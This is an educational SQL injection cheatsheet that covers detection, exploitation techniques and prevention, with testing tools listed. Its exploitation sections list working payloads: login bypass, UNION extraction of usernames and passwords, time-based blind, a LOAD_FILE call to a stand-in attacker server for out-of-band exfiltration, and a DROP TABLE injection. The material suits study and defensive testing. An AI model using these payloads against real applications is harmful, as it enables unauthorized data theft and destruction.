# 🛡️ SQL Injection (SQLi) Cheatsheet

## 🎯 What is SQL Injection?
**SQL Injection (SQLi)** is a web security vulnerability that allows attackers to interfere with the queries an application makes to its database. By injecting malicious SQL statements, attackers can manipulate the application's database to:
- Access unauthorized data.
- Modify or delete data.
- Execute administrative operations.
- Compromise the application's logic.

---

## 🚩 How to Detect SQL Injection Vulnerabilities

1. **Manual Testing:**
   - Test inputs with special characters:
     ```sql
     ' OR 1=1--
     ' UNION SELECT null--
     ```
   - Observe unusual behavior, errors, or data leaks.

2. **Automated Tools:**
   - Use scanners like:
     - [SQLmap](https://sqlmap.org)
     - Burp Suite Intruder with SQL payloads.

3. **Indicators of Vulnerability:**
   - Database error messages revealing stack traces or SQL syntax errors.
   - Behavioral changes, e.g., login bypass or unexpected data in responses.

---

## 🛠️ Exploiting SQL Injection

### 1. **SQL Injection in WHERE Clause (Retrieving Hidden Data)**
- **Vulnerability:** Query structure may leak data:
  ```sql
  SELECT * FROM users WHERE username = 'admin' AND password = 'password';
  ```
- **Payload:**
  ```sql
  ' OR 1=1--
  ```
- **Effect:** The query always evaluates to true, granting access.

---

### 2. **Subverting Application Logic**
- **Login Bypass Example:**
  - Query:
    ```sql
    SELECT * FROM users WHERE username = 'user' AND password = 'pass';
    ```
  - Payload:
    ```sql
    ' OR 1=1--
    ```
  - Result: Bypasses login without valid credentials.

---

### 3. **SQL Injection UNION Attacks**
- Combine results from multiple SELECT queries to extract data.

#### Steps:
1. **Determine Column Count:**
   - Payload:
     ```sql
     ' UNION SELECT NULL, NULL--
     ```
   - Increment `NULL` placeholders until no error occurs.

2. **Find Columns with Useful Data Types:**
   - Payload:
     ```sql
     ' UNION SELECT 'text', NULL--
     ```
   - Replace `NULL` with text to identify text-compatible columns.

3. **Extract Data:**
   - Query to fetch sensitive information:
     ```sql
     ' UNION SELECT username, password FROM users--
     ```

---

### 4. **Blind SQL Injection**
- Occurs when no visible output or error messages are present.

#### Types:
1. **Conditional Responses:**
   - Payload:
     ```sql
     ' AND 1=1--
     ```
   - Observe behavioral differences for true/false conditions.

2. **Error-Based Blind SQLi:**
   - Exploit errors to extract data:
     ```sql
     ' AND (SELECT 1/(SELECT COUNT(*) FROM users))--
     ```

3. **Time-Based Blind SQLi:**
   - Introduce time delays to infer true/false:
     ```sql
     ' OR IF(1=1, SLEEP(5), 0)--
     ```

4. **Out-of-Band (OAST):**
   - Use DNS or HTTP requests to extract data:
     ```sql
     ' OR LOAD_FILE('\\\\attacker-server\\data')--
     ```

---

### 5. **Second-Order SQL Injection**
- Malicious input is stored and later executed during a separate query.
- Example:
  - Inject:
    ```sql
    '); DROP TABLE users;--
    ```
  - Trigger: Query executed on stored malicious input.

---

## 🔬 SQL Injection in Different Contexts

### 1. **Data Retrieval in Non-Oracle Databases**
- Query:
  ```sql
  SELECT table_name FROM information_schema.tables--
  ```
- Example to list columns:
  ```sql
  SELECT column_name FROM information_schema.columns WHERE table_name='users'--
  ```

### 2. **SQL Injection via XML Encoding**
- Exploit payloads bypassing filters:
  ```xml
  <username>&apos; OR 1=1--</username>
  ```

---

## 🔐 Preventing SQL Injection

### 1. **Parameterized Queries (Prepared Statements)**
- Always use parameterized queries instead of string concatenation.
- Example (Python):
  ```python
  cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
  ```

---

### 2. **Input Validation**
- Enforce strict input validation:
  - Disallow special characters (e.g., `';--`).
  - Validate input length and type.

---

### 3. **Use ORM Frameworks**
- Object-Relational Mapping (ORM) frameworks like SQLAlchemy reduce direct query handling risks.

---

### 4. **Escaping User Inputs**
- Use database-specific escaping mechanisms:
  - MySQL: `mysql_real_escape_string()`.
  - PHP PDO: `PDO::quote()`.

---

### 5. **Least Privilege Principle**
- Ensure the database account used by the application has minimal privileges:
  - No access to `DROP`, `ALTER`, or sensitive tables.

---

### 6. **Error Handling**
- Suppress database error messages:
  - Use generic error responses to avoid leaking SQL structure.

---

## 🛠️ Tools for SQL Injection Testing

| Tool        | Purpose                            | URL/Command                          |
|-------------|------------------------------------|--------------------------------------|
| SQLmap      | Automated SQLi exploitation        | [SQLmap](https://sqlmap.org)         |
| Burp Suite  | Manual SQLi payload testing        | [Burp](https://portswigger.net)      |
| jSQL        | Lightweight SQLi scanner          | [jSQL](https://github.com/ron190/jsql-injection) |
| sqlninja    | Exploits blind SQLi vulnerabilities | [sqlninja](http://sqlninja.sourceforge.net/) |
